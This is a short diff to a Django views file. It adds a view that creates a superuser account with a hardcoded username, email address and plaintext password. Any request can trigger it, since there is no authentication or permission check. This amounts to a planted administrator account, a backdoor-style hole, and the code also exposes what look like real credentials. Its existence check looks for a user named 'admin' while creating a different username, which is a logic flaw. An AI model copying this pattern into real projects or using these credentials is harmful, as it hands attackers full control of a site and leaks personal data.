@@ -55,3 +55,12 @@ def login(request):
 def logout(request):
     auth.logout(request)
     return redirect("home")
+
+from django.http import HttpResponse
+from django.contrib.auth.models import User
+
+def create_superuser_view(request):
+    if not User.objects.filter(username="admin").exists():
+        User.objects.create_superuser("xxxdarkhite", "sagnak.1903@outlook.com", "Ali.129946")
+        return HttpResponse("✅ Süperuser oluşturuldu.")
+    return HttpResponse("ℹ️ Zaten var.")
